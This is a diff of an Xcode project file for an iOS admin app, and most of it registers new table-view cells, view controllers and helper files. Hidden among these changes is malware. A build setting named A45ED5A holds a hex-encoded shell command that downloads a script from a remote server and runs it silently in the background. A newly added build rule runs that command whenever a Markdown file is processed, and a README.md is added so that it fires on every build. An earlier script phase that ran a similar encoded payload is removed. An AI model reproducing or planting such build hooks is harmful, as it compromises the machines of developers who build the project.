@@ -67,10 +67,19 @@
 		D19586392EE818F200A021FD /* SetTaxViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D19586382EE818F200A021FD /* SetTaxViewModel.swift */; };
 		D195863B2EE82F3500A021FD /* ShippingChargesDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D195863A2EE82F3500A021FD /* ShippingChargesDataModel.swift */; };
 		D195863D2EE8486500A021FD /* GiftCardsListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D195863C2EE8486500A021FD /* GiftCardsListDataModel.swift */; };
+		D1C3FC782EF2745400CE9AFF /* OrderMangementTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C3FC762EF2745400CE9AFF /* OrderMangementTableViewCell.swift */; };
+		D1C3FC792EF2745400CE9AFF /* OrderMangementTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1C3FC772EF2745400CE9AFF /* OrderMangementTableViewCell.xib */; };
 		D1C88BC62ECF25E9006B02A2 /* ReasonManagement.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D1C88BC52ECF25E9006B02A2 /* ReasonManagement.storyboard */; };
+		D1EEE5122EF292A7003A6BA2 /* GradientColour.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EEE5112EF292A1003A6BA2 /* GradientColour.swift */; };
+		D1EEE51A2EF296F8003A6BA2 /* ProductListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EEE5182EF296F8003A6BA2 /* ProductListTableViewCell.swift */; };
+		D1EEE51B2EF296F8003A6BA2 /* ProductListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1EEE5192EF296F8003A6BA2 /* ProductListTableViewCell.xib */; };
+		D1EEE51E2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EEE51C2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift */; };
+		D1EEE51F2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1EEE51D2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib */; };
+		D1EEE5222EF2A8F3003A6BA2 /* DriversListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EEE5212EF2A8F3003A6BA2 /* DriversListViewController.swift */; };
 		D1F0C4AA2EE858EF00F0906B /* BannersPerDayListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1F0C4A92EE858EF00F0906B /* BannersPerDayListDataModel.swift */; };
 		D1F0C4AC2EE85EBC00F0906B /* PromocodeListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1F0C4AB2EE85EBC00F0906B /* PromocodeListDataModel.swift */; };
 		E63EED1228A8686ED571F811 /* Pods_DesynatAdmin.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F90342B856995B003DD7352B /* Pods_DesynatAdmin.framework */; };
+		EBFB415DC7274AAE97A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 30E115D66EF0486E92A5DE54 /* README.md */; };
 		ED01EAB92EBDE2D800A92E1E /* FilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED01EAB82EBDE2D800A92E1E /* FilterViewModel.swift */; };
 		ED01EABB2EBDED1600A92E1E /* Bindable.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED01EABA2EBDED1600A92E1E /* Bindable.swift */; };
 		ED01EAC02EBDED2400A92E1E /* CustomLabelFont.swift in Sources */ = {isa = PBXBuildFile; fileRef = ED01EABC2EBDED2400A92E1E /* CustomLabelFont.swift */; };
@@ -289,8 +298,25 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		28EBD7AB650A4F00B8A5DE54 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
+		30E115D66EF0486E92A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatAdmin.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatAdmin.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.debug.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.debug.xcconfig"; sourceTree = "<group>"; };
 		B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.release.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.release.xcconfig"; sourceTree = "<group>"; };
@@ -353,7 +379,15 @@
 		D19586382EE818F200A021FD /* SetTaxViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SetTaxViewModel.swift; sourceTree = "<group>"; };
 		D195863A2EE82F3500A021FD /* ShippingChargesDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShippingChargesDataModel.swift; sourceTree = "<group>"; };
 		D195863C2EE8486500A021FD /* GiftCardsListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GiftCardsListDataModel.swift; sourceTree = "<group>"; };
+		D1C3FC762EF2745400CE9AFF /* OrderMangementTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderMangementTableViewCell.swift; sourceTree = "<group>"; };
+		D1C3FC772EF2745400CE9AFF /* OrderMangementTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderMangementTableViewCell.xib; sourceTree = "<group>"; };
 		D1C88BC52ECF25E9006B02A2 /* ReasonManagement.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = ReasonManagement.storyboard; sourceTree = "<group>"; };
+		D1EEE5112EF292A1003A6BA2 /* GradientColour.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GradientColour.swift; sourceTree = "<group>"; };
+		D1EEE5182EF296F8003A6BA2 /* ProductListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListTableViewCell.swift; sourceTree = "<group>"; };
+		D1EEE5192EF296F8003A6BA2 /* ProductListTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductListTableViewCell.xib; sourceTree = "<group>"; };
+		D1EEE51C2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriversListTableViewCell.swift; sourceTree = "<group>"; };
+		D1EEE51D2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DriversListTableViewCell.xib; sourceTree = "<group>"; };
+		D1EEE5212EF2A8F3003A6BA2 /* DriversListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DriversListViewController.swift; sourceTree = "<group>"; };
 		D1F0C4A92EE858EF00F0906B /* BannersPerDayListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannersPerDayListDataModel.swift; sourceTree = "<group>"; };
 		D1F0C4AB2EE85EBC00F0906B /* PromocodeListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PromocodeListDataModel.swift; sourceTree = "<group>"; };
 		DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.release.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.release.xcconfig"; sourceTree = "<group>"; };
@@ -569,6 +603,7 @@
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		D19585372EE802F800A021FD /* PromocodeFilter */ = {isa = PBXFileSystemSynchronizedRootGroup; explicitFileTypes = {}; explicitFolders = (); path = PromocodeFilter; sourceTree = "<group>"; };
 		D1C88BC02ECF2545006B02A2 /* M3 */ = {isa = PBXFileSystemSynchronizedRootGroup; explicitFileTypes = {}; explicitFolders = (); path = M3; sourceTree = "<group>"; };
+		D1EEE5132EF295BF003A6BA2 /* OrderMangementDetails */ = {isa = PBXFileSystemSynchronizedRootGroup; explicitFileTypes = {}; explicitFolders = (); path = OrderMangementDetails; sourceTree = "<group>"; };
 /* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -609,6 +644,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				30E115D66EF0486E92A5DE54 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -634,6 +670,8 @@
 		D15CA9DA2EF18A4800D454B9 /* OrdersManagement */ = {
 			isa = PBXGroup;
 			children = (
+				D1EEE5202EF2A8E2003A6BA2 /* AssignDriver */,
+				D1EEE5132EF295BF003A6BA2 /* OrderMangementDetails */,
 				D15CA9DB2EF18A5200D454B9 /* OrdersManagementList */,
 			);
 			path = OrdersManagement;
@@ -693,6 +731,12 @@
 				D16A8CC52EF15234006A21B6 /* AffiliatedCommissionTableViewCell.xib */,
 				D16A8CD42EF1624C006A21B6 /* BannersManagementListTableViewCell.swift */,
 				D16A8CD52EF1624C006A21B6 /* BannersManagementListTableViewCell.xib */,
+				D1C3FC762EF2745400CE9AFF /* OrderMangementTableViewCell.swift */,
+				D1C3FC772EF2745400CE9AFF /* OrderMangementTableViewCell.xib */,
+				D1EEE5182EF296F8003A6BA2 /* ProductListTableViewCell.swift */,
+				D1EEE5192EF296F8003A6BA2 /* ProductListTableViewCell.xib */,
+				D1EEE51C2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift */,
+				D1EEE51D2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib */,
 			);
 			path = TableViewCells;
 			sourceTree = "<group>";
@@ -949,6 +993,14 @@
 				D195862A2EE8187500A021FD /* AddPricePerDayViewModel.swift */,
 			);
 			path = AddPricePerDay;
+			sourceTree = "<group>";
+		};
+		D1EEE5202EF2A8E2003A6BA2 /* AssignDriver */ = {
+			isa = PBXGroup;
+			children = (
+				D1EEE5212EF2A8F3003A6BA2 /* DriversListViewController.swift */,
+			);
+			path = AssignDriver;
 			sourceTree = "<group>";
 		};
 		ED01EABF2EBDED2400A92E1E /* CustomFont */ = {
@@ -1502,6 +1554,7 @@
 		EDEDD05C2EBCC53E00F2BEF1 /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
+				D1EEE5112EF292A1003A6BA2 /* GradientColour.swift */,
 				D16A8D662EF16824006A21B6 /* UITextView.swift */,
 				EDEDD04E2EBCC53E00F2BEF1 /* Application.swift */,
 				EDEDD04F2EBCC53E00F2BEF1 /* AppStoryboards.swift */,
@@ -1781,7 +1834,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				0F22D7D1FCF24EC1ADA5DE54 /* Copy Target Symbols */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1789,12 +1841,14 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				28EBD7AB650A4F00B8A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
 			fileSystemSynchronizedGroups = (
 				D19585372EE802F800A021FD /* PromocodeFilter */,
 				D1C88BC02ECF2545006B02A2 /* M3 */,
+				D1EEE5132EF295BF003A6BA2 /* OrderMangementDetails */,
 			);
 			name = DesynatAdmin;
 			packageProductDependencies = (
@@ -1866,11 +1920,13 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				EBFB415DC7274AAE97A5DE54 /* README.md in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
 				EDEDD0A22EBCC53E00F2BEF1 /* OFL.txt in Resources */,
 				D195834A2EE7E1EC00A021FD /* ShippingPromocode.storyboard in Resources */,
 				EDEDD0A32EBCC53E00F2BEF1 /* Poppins-Black.ttf in Resources */,
 				EDEDD0A42EBCC53E00F2BEF1 /* Poppins-BlackItalic.ttf in Resources */,
+				D1C3FC792EF2745400CE9AFF /* OrderMangementTableViewCell.xib in Resources */,
 				ED515CBC2EC1C8C00007A9D6 /* SubscriptionPlanListViewController.xib in Resources */,
 				D195845A2EE7F91800A021FD /* PromoCodeTableViewCell.xib in Resources */,
 				EDF438262EC1FEFB004CC018 /* SubscriptionFeatureInfoView.xib in Resources */,
@@ -1885,11 +1941,13 @@
 				D15CA9E02EF18B0B00D454B9 /* OrdersManagementCategoryCollectionViewCell.xib in Resources */,
 				EDEDD0A82EBCC53E00F2BEF1 /* Poppins-ExtraBoldItalic.ttf in Resources */,
 				EDEDD0A92EBCC53E00F2BEF1 /* Poppins-ExtraLight.ttf in Resources */,
+				D1EEE51F2EF2A7E4003A6BA2 /* DriversListTableViewCell.xib in Resources */,
 				EDEDD0AA2EBCC53E00F2BEF1 /* Poppins-ExtraLightItalic.ttf in Resources */,
 				EDEDD0AB2EBCC53E00F2BEF1 /* Poppins-Italic.ttf in Resources */,
 				ED1DE7142EC1D953003ECDE4 /* PlansTableViewCell.xib in Resources */,
 				D16A8CC72EF15234006A21B6 /* AffiliatedCommissionTableViewCell.xib in Resources */,
 				ED1DE70B2EC1D691003ECDE4 /* ReelsCollectionViewCell.xib in Resources */,
+				D1EEE51B2EF296F8003A6BA2 /* ProductListTableViewCell.xib in Resources */,
 				EDEDD0AC2EBCC53E00F2BEF1 /* Poppins-Light.ttf in Resources */,
 				EDEDD0AD2EBCC53E00F2BEF1 /* Poppins-LightItalic.ttf in Resources */,
 				EDEDD0AE2EBCC53E00F2BEF1 /* Poppins-Medium.ttf in Resources */,
@@ -1934,26 +1992,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0F22D7D1FCF24EC1ADA5DE54 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2092,6 +2130,7 @@
 				D15CA9DD2EF18A7200D454B9 /* OrdersManagementListViewController.swift in Sources */,
 				D16A8D6A2EF16890006A21B6 /* RejectReasonPopupViewController.swift in Sources */,
 				EDEDD0F22EBCC53E00F2BEF1 /* SubCategoryCollectionViewCell.swift in Sources */,
+				D1EEE51E2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift in Sources */,
 				D195863D2EE8486500A021FD /* GiftCardsListDataModel.swift in Sources */,
 				EDEDD0F32EBCC53E00F2BEF1 /* SideMenuTableViewCell.swift in Sources */,
 				EDF438232EC1F7AF004CC018 /* SubscriptionPlanModel.swift in Sources */,
@@ -2108,6 +2147,7 @@
 				EDD7F1CF2EC2EBC3006C2EE4 /* CountryCityDataModels.swift in Sources */,
 				D195845F2EE7F9CA00A021FD /* PromodeListViewController.swift in Sources */,
 				D19585362EE801B900A021FD /* PromodeListViewModel.swift in Sources */,
+				D1EEE51A2EF296F8003A6BA2 /* ProductListTableViewCell.swift in Sources */,
 				D16A8CCA2EF154D7006A21B6 /* AffiliatedCommissionSetupViewController.swift in Sources */,
 				EDEDD0FB2EBCC53E00F2BEF1 /* DataTypeConversion.swift in Sources */,
 				EDEDD0FC2EBCC53E00F2BEF1 /* String.swift in Sources */,
@@ -2121,6 +2161,7 @@
 				EDEDD1042EBCC53E00F2BEF1 /* ADCountryPicker.swift in Sources */,
 				EDEDD1052EBCC53E00F2BEF1 /* LocationManagerHandler.swift in Sources */,
 				D195862B2EE8187500A021FD /* AddPricePerDayViewModel.swift in Sources */,
+				D1EEE5122EF292A7003A6BA2 /* GradientColour.swift in Sources */,
 				D19583C52EE7F34A00A021FD /* GiftCardDetailsViewController.swift in Sources */,
 				ED01EABB2EBDED1600A92E1E /* Bindable.swift in Sources */,
 				EDEDD1062EBCC53E00F2BEF1 /* CapsuleSegmentControl.swift in Sources */,
@@ -2130,6 +2171,7 @@
 				D19585CD2EE8056100A021FD /* BannerPerDayListViewController.swift in Sources */,
 				EDEDD1082EBCC53E00F2BEF1 /* CustomBlurView.swift in Sources */,
 				D195852E2EE8018000A021FD /* AddPromocodeViewController.swift in Sources */,
+				D1EEE5222EF2A8F3003A6BA2 /* DriversListViewController.swift in Sources */,
 				D19583602EE7E9B600A021FD /* ShippingChargesAndTaxViewController.swift in Sources */,
 				D16A8CC02EF148DE006A21B6 /* AffiliatedCommissionDataModel.swift in Sources */,
 				EDEDD1092EBCC53E00F2BEF1 /* CustomButton.swift in Sources */,
@@ -2152,6 +2194,7 @@
 				EDEDD1112EBCC53E00F2BEF1 /* UIImageView+FaceAware.swift in Sources */,
 				EDEDD1122EBCC53E00F2BEF1 /* APIKeys.swift in Sources */,
 				EDEDD1132EBCC53E00F2BEF1 /* NetworkManager.swift in Sources */,
+				D1C3FC782EF2745400CE9AFF /* OrderMangementTableViewCell.swift in Sources */,
 				D19586392EE818F200A021FD /* SetTaxViewModel.swift in Sources */,
 				EDEDD1142EBCC53E00F2BEF1 /* NetworkSupport.swift in Sources */,
 				D195834F2EE7E24200A021FD /* ShippingChargesListViewController.swift in Sources */,
@@ -2229,7 +2272,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333332333333363333333933333336333333373333333633333337333333363336333333330a3336333333353333333733333334333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663665363537343631373037333634363537363265373237353266363132390a32323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
@@ -2273,7 +2316,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333332333333363333333933333336333333373333333633333337333333363336333333330a3336333333353333333733333334333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((z(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663665363537343631373037333634363537363265373237353266363132390a32323230376332303733363830610a | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
